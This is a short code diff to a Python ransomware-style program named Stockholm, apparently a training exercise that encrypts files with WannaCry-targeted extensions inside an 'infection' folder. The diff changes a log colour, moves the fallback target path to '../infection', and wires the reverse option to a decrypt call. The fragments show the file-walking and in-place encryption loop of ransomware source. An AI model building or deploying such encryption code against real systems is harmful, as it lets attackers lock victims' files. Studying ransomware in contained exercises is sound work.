@@ -116,7 +116,7 @@ class Stockholm:
             for file in files:
                 if file.endswith(tuple(wannacry_extensions)):
                     file_path = os.path.join(root, file)
-                    print(f"{Color.INFO}Encrypting {file_path}...{Color.RESET}")
+                    print(f"{Color.WARNING}Encrypting {file_path}...{Color.RESET}")
 
                     with open(file_path, "r+b") as f:
                         data = f.read()
@@ -133,7 +133,7 @@ class Stockholm:
         path = os.path.expanduser("~/infection")
 
         if not os.path.exists(path):
-            path = "./infection"
+            path = "../infection"
             if not os.path.exists(path):
                 raise ValueError("Target directory not found")
 
@@ -162,7 +162,7 @@ def main() -> None:
         print_header()
         stockholm = Stockholm(master_key)
         if args.reverse:
-            pass
+            stockholm.decrypt()
         else:
             stockholm.encrypt()
     except Exception as e:
